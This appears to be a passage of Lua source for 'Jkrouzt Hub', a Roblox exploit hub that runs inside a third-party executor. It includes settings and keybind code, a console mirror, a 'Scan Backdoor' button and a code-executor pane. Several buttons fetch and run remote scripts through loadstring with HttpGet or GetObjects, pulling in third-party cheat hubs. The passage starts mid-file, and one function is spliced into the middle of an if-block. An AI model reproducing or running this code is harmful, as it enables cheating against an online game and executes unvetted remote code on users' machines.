settingf2.BorderSizePixel = 3

setf2b = Instance.new("Frame")
setf2b.Name = "setf2b"
setf2b.Parent = settingf2
setf2b.Size = UDim2.new(0.4, 0, 0.8, 0)
setf2b.Position = UDim2.new(0.1, 0, 0.1, 0)
setf2b.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
setf2b.BorderSizePixel = 0
setf2b.AnchorPoint = Vector2.new(0.5, 0.5)
setf2b.Position = UDim2.new(0.25,0,0.5,0)

settingf3 = Instance.new("TextButton")
settingf3.Name = "settingf3"
settingf3.Parent = Lastshit
settingf3.Size = UDim2.new(0, 100, 0, 30)
settingf3.Position = UDim2.new(0, 535, 0, 130)
settingf3.Text = ""
settingf3.TextScaled = true
settingf3.Font = Enum.Font.Code
settingf3.TextColor3 = Color3.new(1, 1, 1)
settingf3.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
settingf3.BorderColor3 = Color3.new(1, 0, 0)
settingf3.BorderSizePixel = 3

setf3b = Instance.new("Frame")
setf3b.Name = "setf3b"
setf3b.Parent = settingf3
setf3b.Size = UDim2.new(0.4, 0, 0.8, 0)
setf3b.Position = UDim2.new(0.1, 0, 0.1, 0)
setf3b.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
setf3b.BorderSizePixel = 0
setf3b.AnchorPoint = Vector2.new(0.5, 0.5)
setf3b.Position = UDim2.new(0.25,0,0.5,0)

settingf5 = Instance.new("TextButton")
settingf5.Name = "settingf5"
settingf5.Parent = Lastshit
settingf5.Size = UDim2.new(0, 100, 0, 30)
settingf5.Position = UDim2.new(0, 535, 0, 190)
settingf5.Text = ""
settingf5.TextScaled = true
settingf5.Font = Enum.Font.Code
settingf5.TextColor3 = Color3.new(1, 1, 1)
settingf5.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
settingf5.BorderColor3 = Color3.new(1, 0, 0)
settingf5.BorderSizePixel = 3

setf5b = Instance.new("Frame")
setf5b.Name = "setf5b"
setf5b.Parent = settingf5
setf5b.Size = UDim2.new(0.4, 0, 0.8, 0)
setf5b.Position = UDim2.new(0.1, 0, 0.1, 0)
setf5b.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
setf5b.BorderSizePixel = 0
setf5b.AnchorPoint = Vector2.new(0.5, 0.5)
setf5b.Position = UDim2.new(0.25,0,0.5,0)

settingf4 = Instance.new("TextBox")
settingf4.Parent = Lastshit
settingf4.Name = "UiKeybind"
settingf4.Size = UDim2.new(0, 200, 0, 50)
settingf4.Position = UDim2.new(0, 55, 0, 170)
settingf4.BackgroundColor3 = Color3.new(0, 0, 0)
settingf4.BackgroundTransparency = 0
settingf4.BorderColor3 = Color3.new(1, 0, 0)
settingf4.BorderSizePixel = 2
settingf4.PlaceholderText = "Keybind Here"
settingf4.PlaceholderColor3 = Color3.new(1, 1, 1)
settingf4.TextColor3 = Color3.new(1, 1, 1)
settingf4.Text = "Type Key here"
settingf4.TextScaled = true
settingf4.Font = Enum.Font.GothamBold

local ckimage = Instance.new("ImageLabel")
ckimage.Parent = home
ckimage.Name = "ckimage"
ckimage.Size = UDim2.new(0, 100, 0, 100)
ckimage.Position = UDim2.new(0.5, -300, 0.5, -50)
ckimage.AnchorPoint = Vector2.new(0, 0.7)
ckimage.BackgroundColor3 = Color3.new(0, 0, 0)
ckimage.BackgroundTransparency = 0
ckimage.BorderColor3 = Color3.new(1,0,0)
ckimage.BorderSizePixel = 1
ckimage.Image = "rbxassetid://117259454598676"

useProfilePicture = false
profilePictureFile = "jksettings/ProfilePicture.txt"

function loadHeadshot()
    local player = Players.LocalPlayer
    local userId = player.UserId
    local thumbType = Enum.ThumbnailType.HeadShot
    local thumbSize = Enum.ThumbnailSize.Size420x420
    local success, content = pcall(Players.GetUserThumbnailAsync, Players, userId, thumbType, thumbSize)
    if success and content then
        return content
    else
        warn("Failed to load player headshot: " .. tostring(content))
        return nil
    end
end

function updVisual()
    local targetPosition
    local targetColor

    if useProfilePicture then
        targetPosition = UDim2.new(0.75, 0, 0.5, 0)
        targetColor = Color3.fromRGB(0, 255, 0)
        settingf3.BorderColor3 = Color3.new(0, 1, 0)
        ckimage.BorderSizePixel = 2
    else
        targetPosition = UDim2.new(0.25, 0, 0.5, 0)
        targetColor = Color3.fromRGB(255, 0, 0)
        settingf3.BorderColor3 = Color3.new(1, 0, 0)
        ckimage.BorderSizePixel = 1
    end


    local tweenInfo = TweenInfo.new(
        0.2,
        Enum.EasingStyle.Quad,
        Enum.EasingDirection.Out
    )

    local positionTween = TweenService:Create(setf3b, tweenInfo, {Position = targetPosition})
    local colorTween = TweenService:Create(setf3b, tweenInfo, {BackgroundColor3 = targetColor})


    positionTween:Play()
    colorTween:Play()
end

function updateCkImage()
    if not ckimage then return end
    if useProfilePicture then
        local headshotURL = loadHeadshot()
        if headshotURL then
            ckimage.Image = headshotURL
        else
            ckimage.Image = "rbxassetid://117259454598676"
        end
    else
        ckimage.Image = "rbxassetid://117259454598676"
    end
end



settingf3.MouseButton1Click:Connect(function()
    useProfilePicture = not useProfilePicture
    updateCkImage()
    updVisual()
    writefile(profilePictureFile, "useProfilePicture = " .. tostring(useProfilePicture))
end)

if isfile(profilePictureFile) then
    fileContent = readfile(profilePictureFile)
    if fileContent then
        useProfilePictureValue = fileContent:match("useProfilePicture = (%w+)")
        if useProfilePictureValue == "true" then
            useProfilePicture = true
        elseif useProfilePictureValue == "false" then
            useProfilePicture = false
        end
    end
end

updateCkImage()
updVisual()

defaultKey = Enum.KeyCode.RightControl
currentKey = defaultKey
keyNameFile = "jksettings/toggleKeybind.txt"

Keys = {
    Enum.KeyCode.Escape, Enum.KeyCode.F1, Enum.KeyCode.F2, Enum.KeyCode.F3, Enum.KeyCode.F4, Enum.KeyCode.F5, Enum.KeyCode.F6, Enum.KeyCode.F7, Enum.KeyCode.F8, Enum.KeyCode.F9, Enum.KeyCode.F10, Enum.KeyCode.F11, Enum.KeyCode.F12, Enum.KeyCode.Delete,
    Enum.KeyCode.Backquote, Enum.KeyCode.One, Enum.KeyCode.Two, Enum.KeyCode.Three, Enum.KeyCode.Four, Enum.KeyCode.Five, Enum.KeyCode.Six, Enum.KeyCode.Seven, Enum.KeyCode.Eight, Enum.KeyCode.Nine, Enum.KeyCode.Zero, Enum.KeyCode.Minus, Enum.KeyCode.Equals, Enum.KeyCode.Backspace,
    Enum.KeyCode.Tab, Enum.KeyCode.Q, Enum.KeyCode.W, Enum.KeyCode.E, Enum.KeyCode.R, Enum.KeyCode.T, Enum.KeyCode.Y, Enum.KeyCode.U, Enum.KeyCode.I, Enum.KeyCode.O, Enum.KeyCode.P, Enum.KeyCode.LeftBracket, Enum.KeyCode.RightBracket,
    Enum.KeyCode.CapsLock, Enum.KeyCode.A, Enum.KeyCode.S, Enum.KeyCode.D, Enum.KeyCode.F, Enum.KeyCode.G, Enum.KeyCode.H, Enum.KeyCode.J, Enum.KeyCode.K, Enum.KeyCode.L, Enum.KeyCode.Semicolon, 
    Enum.KeyCode.LeftShift, Enum.KeyCode.Z, Enum.KeyCode.X, Enum.KeyCode.C, Enum.KeyCode.V, Enum.KeyCode.B, Enum.KeyCode.N, Enum.KeyCode.M, Enum.KeyCode.Comma, Enum.KeyCode.Period, Enum.KeyCode.Slash, Enum.KeyCode.RightShift,
    Enum.KeyCode.LeftControl, Enum.KeyCode.LeftAlt, Enum.KeyCode.Space, Enum.KeyCode.RightAlt, Enum.KeyCode.RightControl, Enum.KeyCode.Up, Enum.KeyCode.Left, Enum.KeyCode.Down, Enum.KeyCode.Right
}

textToKeyCodes = {
    [";"] = Enum.KeyCode.Semicolon,
    [","] = Enum.KeyCode.Comma,
    ["."] = Enum.KeyCode.Period,
    ["/"] = Enum.KeyCode.Slash,
    ["["] = Enum.KeyCode.LeftBracket,
    ["]"] = Enum.KeyCode.RightBracket,
    ["`"] = Enum.KeyCode.Backquote,
    ["-"] = Enum.KeyCode.Minus,
    ["="] = Enum.KeyCode.Equals,
    [" "] = Enum.KeyCode.Space,
    ["lctrl"] = Enum.KeyCode.LeftControl,
    ["rctrl"] = Enum.KeyCode.RightControl,
    ["lshift"] = Enum.KeyCode.LeftShift,
    ["rshift"] = Enum.KeyCode.RightShift,
    ["lalt"] = Enum.KeyCode.LeftAlt,
    ["ralt"] = Enum.KeyCode.RightAlt,
    ["LControl"] = Enum.KeyCode.LeftControl,
    ["RControl"] = Enum.KeyCode.RightControl,
    ["LShift"] = Enum.KeyCode.LeftShift,
    ["RShift"] = Enum.KeyCode.RightShift,
    ["LAlt"] = Enum.KeyCode.LeftAlt,
    ["RAlt"] = Enum.KeyCode.RightAlt,
    ["leftctrl"] = Enum.KeyCode.LeftControl,
    ["rightctrl"] = Enum.KeyCode.RightControl,
    ["leftshift"] = Enum.KeyCode.LeftShift,
    ["rightshift"] = Enum.KeyCode.RightShift,
    ["leftalt"] = Enum.KeyCode.LeftAlt,
    ["rightalt"] = Enum.KeyCode.RightAlt,
    ["LeftControl"] = Enum.KeyCode.LeftControl,
    ["RightControl"] = Enum.KeyCode.RightControl,
    ["LeftShift"] = Enum.KeyCode.LeftShift,
    ["RightShift"] = Enum.KeyCode.RightShift,
    ["LeftAlt"] = Enum.KeyCode.LeftAlt,
    ["RightAlt"] = Enum.KeyCode.RightAlt,
    ["leftcontrol"] = Enum.KeyCode.LeftControl,
    ["rightcontrol"] = Enum.KeyCode.RightControl,
    ["leftshift"] = Enum.KeyCode.LeftShift,
    ["rightshift"] = Enum.KeyCode.RightShift,
    ["leftalt"] = Enum.KeyCode.LeftAlt,
    ["rightalt"] = Enum.KeyCode.RightAlt,
    ["LeftControl"] = Enum.KeyCode.LeftControl,
    ["RightControl"] = Enum.KeyCode.RightControl,
    ["LeftShift"] = Enum.KeyCode.LeftShift,
    ["RightShift"] = Enum.KeyCode.RightShift,
    ["LeftAlt"] = Enum.KeyCode.LeftAlt,
    ["RightAlt"] = Enum.KeyCode.RightAlt,
    ["0"] = Enum.KeyCode.Zero,
    ["1"] = Enum.KeyCode.One,
    ["2"] = Enum.KeyCode.Two,
    ["3"] = Enum.KeyCode.Three,
    ["4"] = Enum.KeyCode.Four,
    ["5"] = Enum.KeyCode.Five,
    ["6"] = Enum.KeyCode.Six,
    ["7"] = Enum.KeyCode.Seven,
    ["8"] = Enum.KeyCode.Eight,
    ["9"] = Enum.KeyCode.Nine,
}

function saveKeyName(keyName)
    writefile(keyNameFile, keyName)
end

function loadKeyName()
    if isfile(keyNameFile) then
        local fileContent = readfile(keyNameFile)
        if fileContent then
            return fileContent
        end
    end
    return "RightControl"
end

function setKeybind(key)
    currentKey = key
    if settingf4 then
        settingf4.Text = key.Name
    end
    saveKeyName(key.Name)
end

savedKeyName = loadKeyName()
savedKey = Enum.KeyCode[savedKeyName]
if savedKey then
    currentKey = savedKey
else
    currentKey = defaultKey
    saveKeyName(defaultKey.Name)
end

if settingf4 then
    settingf4.Text = currentKey.Name
end

UserInputService.InputBegan:Connect(function(input, gameProcessedEvent)
    if gameProcessedEvent then return end

    if input.KeyCode == currentKey then
        toggleGUI()
    end
end)

settingf4.FocusLost:Connect(function(enterPressed)
    local input = settingf4.Text
    local foundKey = nil

    if textToKeyCodes[input] then
        foundKey = textToKeyCodes[input]
    elseif string.len(input) == 1 then
        local upperInput = string.upper(input)
        for _, key in ipairs(Keys) do
            if string.upper(key.Name) == upperInput then
                foundKey = key
                break
            end
        end
    end

    if foundKey then
        setKeybind(foundKey)
    else
        notif({
            Text = "Invalid key or Unsupported Key. Check Console For Supported Keys",
            Duration = 6,
            topm = "Warning!"
        })
local function printKeyCodes(keyTable)
    print("Available KeyCodes:")
    for i, key in ipairs(keyTable) do
        print(i, key.Name)
    end
end

printKeyCodes(Keys)

local function printTextToKeyCodes(table)
    print("Text to KeyCode mappings:")
    for text, keyCode in pairs(table) do
        print(string.format("Text: '%s', KeyCode: %s", text, keyCode.Name))
    end
end

printTextToKeyCodes(textToKeyCodes)

        if settingf4 then
            settingf4.Text = currentKey.Name
        end
    end
end)


consoleb = Instance.new("TextButton")
function scriptt()
	local script = Instance.new('LocalScript', consoleb)

	local activated = false

	script.Parent.MouseButton1Click:Connect(function()
		activated = not activated
		game:GetService("StarterGui"):SetCore("DevConsoleVisible", activated)
	end)
end
coroutine.wrap(scriptt)()

consoleb.Name = "ConsoleButtAss"
consoleb.Size = UDim2.new(0, 200, 0, 50)
consoleb.Position = UDim2.new(0, 435, 0, 250)
consoleb.BackgroundColor3 = Color3.new(0, 0, 0)
consoleb.BorderColor3 = Color3.new(1, 0, 0)
consoleb.BorderSizePixel = 3
consoleb.Text = "Open Console"
consoleb.Font = Enum.Font.Code
consoleb.TextColor3 = Color3.new(1, 1, 1)
consoleb.TextScaled = true
consoleb.RichText = true
consoleb.Parent = Lastshit
consoleb.MouseButton1Click:Connect(function()
scriptt()
end)

febypass = Instance.new("TextButton")
febypass.Name = "FeBypassReal!!!!!"
febypass.Size = UDim2.new(0, 165, 0, 50)
febypass.Position = UDim2.new(0, 243, 0, 250)
febypass.BackgroundColor3 = Color3.new(0, 0, 0)
febypass.BorderColor3 = Color3.new(1, 0, 0)
febypass.BorderSizePixel = 3
febypass.Text = "Scan Backdoor"
febypass.Font = Enum.Font.Code
febypass.TextColor3 = Color3.new(1, 1, 1)
febypass.TextScaled = true
febypass.RichText = true
febypass.Parent = Lastshit

febypassfake = Instance.new("TextButton")
febypassfake.Parent = Lastshit
febypassfake.Name = "febypassfake"
febypassfake.Size = UDim2.new(0, 205, 0, 50)
febypassfake.Position = UDim2.new(0, 10, 0, 250)
febypassfake.BackgroundColor3 = Color3.new(0, 0, 0)
febypassfake.BorderColor3 = Color3.new(1, 0, 0)
febypassfake.BorderSizePixel = 3
febypassfake.TextColor3 = Color3.new(1, 1, 1)
febypassfake.TextScaled = true
febypassfake.Font = Enum.Font.Code
febypassfake.Text = "Execution: Client"

OutPenls = Instance.new("ScrollingFrame")
OutPenls.Parent = Lastshit
OutPenls.Name = "OutPenls"
OutPenls.Size = UDim2.new(0, 600, 0, 250)
OutPenls.Position = UDim2.new(0, 25, 0, 350)
OutPenls.BackgroundColor3 = Color3.new(0, 0, 0)
OutPenls.BorderColor3 = Color3.new(255, 0, 0)
OutPenls.BorderSizePixel = 2
OutPenls.CanvasSize = UDim2.new(0, 500, 0, 500)
OutPenls.ScrollBarThickness = 10
OutPenls.ScrollBarImageColor3 = Color3.new(2, 2, 2)
OutPenls.ScrollingDirection = Enum.ScrollingDirection.Y
OutPenls.ScrollBarImageTransparency = 0

utput = Instance.new("TextButton")
utput.Name = "utput"
utput.Size = UDim2.new(0, 600, 0, 25)
utput.Position = UDim2.new(0, 25, 0, 330)
utput.BackgroundColor3 = Color3.new(0, 0, 0)
utput.BorderColor3 = Color3.new(1, 0, 0)
utput.BorderSizePixel = 3
utput.Text = "Output"
utput.Font = Enum.Font.Code
utput.TextColor3 = Color3.new(1, 1, 1)
utput.TextScaled = true
utput.RichText = true
utput.Parent = Lastshit

content = Instance.new("Frame")
content.Name = "content"
content.Size = UDim2.new(1, 0, 0, 0) 
content.BackgroundTransparency = 1
content.Parent = OutPenls

shits = Instance.new("UIListLayout")
shits.Parent = content
shits.SortOrder = Enum.SortOrder.LayoutOrder
shits.Padding = UDim.new(0, 5) 

shits:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
    OutPenls.CanvasSize = UDim2.new(0, 0, 0, shits.AbsoluteContentSize.Y)
    OutPenls.CanvasPosition = Vector2.new(0, OutPenls.CanvasSize.Y.Offset)
end)

function appendConsoleMessage(msg, messageType)
    local messageLabel = Instance.new("TextLabel")
    messageLabel.Name = "LogMessage"
    messageLabel.Size = UDim2.new(1, -10, 0, 0) 
    messageLabel.Position = UDim2.new(0, 5, 0, 0) 
    messageLabel.BackgroundTransparency = 1
    messageLabel.TextWrapped = true
    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
    messageLabel.TextYAlignment = Enum.TextYAlignment.Top
    messageLabel.Font = Enum.Font.Code
    messageLabel.TextSize = 18
    messageLabel.AutomaticSize = Enum.AutomaticSize.Y 
    local formattedMsg = msg
    if messageType == Enum.MessageType.MessageWarning then
        messageLabel.TextColor3 = Color3.fromRGB(255, 255, 0) 
        formattedMsg = "[WARN] " .. msg
    elseif messageType == Enum.MessageType.MessageError then
        messageLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
        formattedMsg = "[ERROR] " .. msg
    else 
        messageLabel.TextColor3 = Color3.new(1, 1, 1) 
        formattedMsg = "[INFO] " .. msg
    end
    
    messageLabel.Text = formattedMsg
    messageLabel.Parent = content
    
    task.defer(function()
        content.Size = UDim2.new(1, 0, 0, shits.AbsoluteContentSize.Y)
    end)
end

utput.MouseButton1Click:Connect(function()
    for _, child in ipairs(content:GetChildren()) do
        if child:IsA("TextLabel") then 
            child:Destroy()
        end
    end
    OutPenls.CanvasSize = UDim2.new(0, 0, 0, 0)
    content.Size = UDim2.new(1, 0, 0, 0)
end)

LogService.MessageOut:Connect(function(msg, messageType)
    appendConsoleMessage(msg, messageType)
end)

local first = Instance.new("TextLabel")
first.Parent = home
first.Name = "first" 
first.Size = UDim2.new(0.4, 0, 0.3, 0)
first.Position = UDim2.new(0.21, 0, 0.01, 0)
first.BackgroundColor3 = Color3.new(0, 1, 0)
first.BackgroundTransparency = 1
first.BorderColor3 = Color3.new(0, 0, 0)
first.BorderSizePixel = 1
first.TextColor3 = Color3.new(1, 1, 1)
first.TextScaled = true
first.Font = Enum.Font.SourceSansBold
first.TextXAlignment = Enum.TextXAlignment.Left
first.TextYAlignment = Enum.TextYAlignment.Center
first.Text = "Welcome back, " .. game.Players.LocalPlayer.Name


local first2 = Instance.new("TextLabel")
first2.Parent = home
first2.Name = "first2"
first2.Size = UDim2.new(0.3, 0, 0.2, 0)
first2.Position = UDim2.new(0.69, 0, 0.02, 0)
first2.BackgroundColor3 = Color3.new(1, 1, 1)
first2.BackgroundTransparency = 1
first2.BorderColor3 = Color3.new(0, 0, 0)
first2.BorderSizePixel = 1
first2.TextColor3 = Color3.new(1, 1, 1)
first2.TextScaled = true
first2.Font = Enum.Font.GothamBlack
first2.TextXAlignment = Enum.TextXAlignment.Left
first2.TextYAlignment = Enum.TextYAlignment.Center
first2.Text = "Jkrouzt Hub Made By jkrouzt\nIn Discord"

uiG = Instance.new("UIGradient")
uiG.Parent = first2

hue = 0
speed = 0.4

function createColorSequence(currentHue)
	local keypoints = {}
	for i = 0, 1, 0.2 do
		local h = (currentHue + i) % 1
		local color = Color3.fromHSV(h, 1, 1)
		table.insert(keypoints, ColorSequenceKeypoint.new(i, color))
	end
	return ColorSequence.new(keypoints)
end

RunService.Heartbeat:Connect(function(delta)
	hue = (hue + delta * speed) % 1
	uiG.Color = createColorSequence(hue)
end)

first3 = Instance.new("TextLabel")
first3.Name = "first3"
first3.Parent = home
first3.Size = UDim2.new(0.3, 0, 0.15, 0)
first3.Position = UDim2.new(0.0, 135, 0.30, 0)
first3.BackgroundColor3 = Color3.new(0, 0, 0)
first3.BackgroundTransparency = 1
first3.TextColor3 = Color3.new(1, 1, 1)
first3.TextScaled = true
first3.Font = Enum.Font.SourceSansBold
first3.Text = ""
first3.TextXAlignment = Enum.TextXAlignment.Left
first3.TextYAlignment = Enum.TextYAlignment.Center
first3.Text = "Loading"

for i = 1, 100 do
    first3.Text = "Loading: " .. i .. "%"
    wait()
end

first3.Text = "Jkrouzt Hub successfully executed!"


info = Instance.new("TextLabel")
info.Parent = home
info.Name = "info" 
info.Size = UDim2.new(0.3, 0, 0.15, 0)
info.Position = UDim2.new(0, 25, 0.45, 0)
info.BackgroundColor3 = Color3.new(0, 1, 0)
info.BackgroundTransparency = 1
info.BorderColor3 = Color3.new(0, 0, 0)
info.BorderSizePixel = 1
info.TextColor3 = Color3.new(1, 1, 1)
info.TextScaled = true
info.TextXAlignment = Enum.TextXAlignment.Left
info.TextYAlignment = Enum.TextYAlignment.Center
info.Font = Enum.Font.SourceSansBold
info.Text = "age"

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

if LocalPlayer then
    local accountAgeInDays = LocalPlayer.AccountAge
    local accountAgeText = ""

    if accountAgeInDays < 1 then
        accountAgeText = "Less than a day old"
    elseif accountAgeInDays == 1 then
        accountAgeText = "1 day old"
    else
        accountAgeText = accountAgeInDays .. " days old"
    end

    if info and info:IsA("TextLabel") then
        info.Text = "Account Age: " .. accountAgeText
    end
end

info2 = Instance.new("TextLabel")
info2.Parent = home
info2.Name = "info"
info2.Size = UDim2.new(0.3, 0, 0.15, 0)
info2.Position = UDim2.new(0, 25, 0.55, 0)
info2.BackgroundColor3 = Color3.new(0, 1, 0)
info2.BackgroundTransparency = 1
info2.BorderColor3 = Color3.new(0, 0, 0)
info2.BorderSizePixel = 1
info2.TextColor3 = Color3.new(1, 1, 1)
info2.TextScaled = true
info2.TextXAlignment = Enum.TextXAlignment.Left
info2.TextYAlignment = Enum.TextYAlignment.Center
info2.Font = Enum.Font.SourceSansBold

info3 = Instance.new("TextButton")
info3.Parent = home
info3.Name = "info3"
info3.Size = UDim2.new(0.6, 0, 0.15, 0)
info3.Position = UDim2.new(0, 25, 0.65, 0)
info3.BackgroundColor3 = Color3.new(0, 1, 0)
info3.BackgroundTransparency = 1
info3.BorderColor3 = Color3.new(0, 0, 0)
info3.BorderSizePixel = 1
info3.TextColor3 = Color3.new(1, 1, 1)
info3.TextScaled = true
info3.TextXAlignment = Enum.TextXAlignment.Left
info3.TextYAlignment = Enum.TextYAlignment.Center
info3.Text = "Job ID: " .. game.JobId
info3.Font = Enum.Font.SourceSansBold
info3.MouseButton1Click:Connect(function()
	setClipboard(game.JobId)
	notif({
		Text = "game.JobId Copied to your clipboard!",
		Duration = 3,
		topm = "Success!"
	})
end)

local placeId = game.PlaceId
local gameName = game.Name
local info4 = Instance.new("TextButton")
info4.Parent = home
info4.Name = "info4" 
info4.Size = UDim2.new(0.7, 0, 0.15, 0)
info4.Position = UDim2.new(0, 25, 0.75, 0)
info4.BackgroundColor3 = Color3.new(0, 1, 0)
info4.BackgroundTransparency = 1
info4.BorderColor3 = Color3.new(0, 0, 0)
info4.BorderSizePixel = 1
info4.TextColor3 = Color3.new(1, 1, 1)
info4.TextScaled = true
info4.TextXAlignment = Enum.TextXAlignment.Left
info4.TextYAlignment = Enum.TextYAlignment.Center
info4.Font = Enum.Font.SourceSansBold
info4.Text = "PlaceID: " .. placeId .. " (" .. gameName .. ")"
info4.MouseButton1Click:Connect(function()
	setClipboard(info4.Text)
	notif({
		Text = "placeId",
		Duration = 3,
		topm = "Success!"
	})
end)

local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 130, 0, 50)
button.Position = UDim2.new(0, 500, 0, 200)
button.BackgroundColor3 = Color3.new(0, 0, 0)
button.BorderColor3 = Color3.new(0, 0, 1)
button.BorderSizePixel = 3
button.Text = "[Client Sided Scripts]"
button.TextColor3 = Color3.new(1, 1, 1)
button.TextScaled = true
button.RichText = true
button.Parent = home
button.MouseButton1Click:Connect(function()
	notif({
		Text = "Client Sided Scripts means that the scropt will only happens on your client/screen and will not effects to other players.",
		Duration = 10,
		topm = "Information!"
	})
end)

keysis = Instance.new("TextButton")
keysis.Size = UDim2.new(0, 130, 0, 50)
keysis.Position = UDim2.new(0, 500, 0, 135)
keysis.BackgroundColor3 = Color3.new(0, 0, 0)
keysis.BorderColor3 = Color3.new(1, 1, 0)
keysis.BorderSizePixel = 3
keysis.Text = "[Key System Scripts]"
keysis.TextColor3 = Color3.new(1, 1, 1)
keysis.TextScaled = true
keysis.Parent = home
keysis.MouseButton1Click:Connect(function()
	notif({
		Text = "Scripts with Key System means that you need to go into a Website and doing some tasks for the creators of scripts, but sometimes scripts with Key systems is Good..",
		Duration = 20,
		topm = "Information!"
	})
end)

harked = Instance.new("TextButton")
harked.Size = UDim2.new(0, 130, 0, 50)
harked.Position = UDim2.new(0, 500, 0, 70)
harked.BackgroundColor3 = Color3.new(0, 0, 0)
harked.BorderColor3 = Color3.new(0, 1, 0)
harked.BorderSizePixel = 3
harked.Text = "[FE Scripts]"
harked.TextColor3 = Color3.new(1, 1, 1)
harked.TextScaled = true
harked.Parent = home
harked.MouseButton1Click:Connect(function()
	notif({
		Text = "FE Scripts or Filtering Enabled Scripts is a Script that Other Players can see like you bringing Parts or Reanimation.",
		Duration = 9,
		topm = "Information!"
	})
end)

local loopButt = Instance.new("TextButton")
loopButt.Parent = exec
loopButt.Name = "loopButt"
loopButt.Size = UDim2.new(0.25000003, 0, 0.150000006, 0)
loopButt.Position = UDim2.new(0.00996587239, 0, 0.83099997, 0)
loopButt.BackgroundColor3 = Color3.new(0, 0, 0)
loopButt.BorderColor3 = Color3.new(1, 0, 0)
loopButt.BorderSizePixel = 3
loopButt.TextColor3 = Color3.new(1, 1, 1)
loopButt.TextScaled = true
loopButt.Font = Enum.Font.Code
loopButt.Text = "Execute"

local codeTextBox = Instance.new("TextBox")
codeTextBox.Parent = exec
codeTextBox.Name = "codeTextBox"
codeTextBox.Size = UDim2.new(0.98, 0, -0.78, 0)
codeTextBox.Position = UDim2.new(0.01, 0, 0.80, 0)
codeTextBox.BackgroundColor3 = Color3.new(0, 0, 0)
codeTextBox.BorderColor3 = Color3.new(1, 0, 0)
codeTextBox.BorderSizePixel = 3
codeTextBox.TextColor3 = Color3.new(1, 1, 1)
codeTextBox.TextSize = 28
codeTextBox.Text = "Script Here"
codeTextBox.PlaceholderText = "Enter your script here..."
codeTextBox.Font = Enum.Font.SourceSans
codeTextBox.TextXAlignment = Enum.TextXAlignment.Left
codeTextBox.TextYAlignment = Enum.TextYAlignment.Top
codeTextBox.TextWrapped = true
codeTextBox.ClearTextOnFocus = false
codeTextBox.MultiLine = true

local clear = Instance.new("TextButton")
clear.Parent = exec
clear.Name = "clear"
clear.Size = UDim2.new(0.25000003, 0, 0.150000006, 0)
clear.Position = UDim2.new(0.279965907, 0, 0.83099997, 0)
clear.BackgroundColor3 = Color3.new(0, 0, 0)
clear.BorderColor3 = Color3.new(1, 0, 0)
clear.BorderSizePixel = 3
clear.TextColor3 = Color3.new(1, 1, 1)
clear.TextScaled = true
clear.Font = Enum.Font.Code
clear.Text = "Clear"
clear.MouseButton1Click:Connect(function()
    codeTextBox.Text = ""
end)

local loopbx = Instance.new("TextBox")
loopbx.Parent = exec
loopbx.Name = "loopbx"
loopbx.Size = UDim2.new(0.170000032, 0, 0.150000006, 0)
loopbx.Position = UDim2.new(0.819965899, 0, 0.83099997, 0)
loopbx.BackgroundColor3 = Color3.new(0, 0, 0)
loopbx.BorderColor3 = Color3.new(1, 0, 0)
loopbx.BorderSizePixel = 3
loopbx.TextColor3 = Color3.new(1, 1, 1)
loopbx.TextScaled = true
loopbx.Font = Enum.Font.Code
loopbx.Text = "Loop Speed"
loopbx.PlaceholderText = "seconds"

local loope = Instance.new("TextButton")
loope.Parent = exec
loope.Name = "loope"
loope.Size = UDim2.new(0.25000003, 0, 0.150000006, 0)
loope.Position = UDim2.new(0.549965858, 0, 0.83099997, 0)
loope.BackgroundColor3 = Color3.new(0, 0, 0)
loope.BorderColor3 = Color3.new(1, 0, 0)
loope.BorderSizePixel = 3
loope.TextColor3 = Color3.new(1, 1, 1)
loope.TextScaled = true
loope.Font = Enum.Font.Code
loope.Text = "Loop"

local sc1 = Instance.new("TextButton")
sc1.Parent = sc
sc1.Name = "sc1"
sc1.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc1.Position = UDim2.new(0.00996587239, 0, 0.150, 0)
sc1.BackgroundColor3 = Color3.new(0, 0, 0)
sc1.BorderColor3 = Color3.new(1, 0, 0)
sc1.BorderSizePixel = 3
sc1.TextColor3 = Color3.new(1, 1, 1)
sc1.TextScaled = true
sc1.Font = Enum.Font.Roboto
sc1.Text = "Ez Hub"
sc1.MouseButton1Click:Connect(function()
     loadstring(game:HttpGet(('https://raw.githubusercontent.com/debug420/Ez-Industries-Launcher-Data/master/Launcher.lua'),true))()
end)

local sc2 = Instance.new("TextButton")
sc2.Parent = sc
sc2.Name = "sc2"
sc2.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc2.Position = UDim2.new(0.18, 0, 0.150, 0)
sc2.BackgroundColor3 = Color3.new(0, 0, 0)
sc2.BorderColor3 = Color3.new(1, 0, 0)
sc2.BorderSizePixel = 3
sc2.TextColor3 = Color3.new(1, 1, 1)
sc2.TextScaled = true
sc2.Font = Enum.Font.Roboto
sc2.Text = "Psy Hub 2"
sc2.MouseButton1Click:Connect(function()
    loadstring(game:GetObjects("rbxassetid://3014051754")[1].Source)()
end)

local sc3 = Instance.new("TextButton")
sc3.Parent = sc
sc3.Name = "sc3"
sc3.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc3.Position = UDim2.new(0.35, 0, 0.150, 0)
sc3.BackgroundColor3 = Color3.new(0, 0, 0)
sc3.BorderColor3 = Color3.new(1, 0, 0)
sc3.BorderSizePixel = 3
sc3.TextColor3 = Color3.new(1, 1, 1)
sc3.TextScaled = true
sc3.Font = Enum.Font.Roboto
sc3.Text = "Owl Hub"
sc3.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CriShoux/OwlHub/master/OwlHub.txt"))();
end)

local sc4 = Instance.new("TextButton")
sc4.Parent = sc
sc4.Name = "sc4"
sc4.Size = UDim2.new(0.15000003, 0, 0.150000006, 0)
sc4.Position = UDim2.new(0.52, 0, 0.150, 0)
sc4.BackgroundColor3 = Color3.new(0, 0, 0)
sc4.BorderColor3 = Color3.new(1, 0, 0)
sc4.BorderSizePixel = 3
sc4.TextColor3 = Color3.new(1, 1, 1)
sc4.TextScaled = true
sc4.Font = Enum.Font.Roboto
sc4.Text = "Infinite Yield"
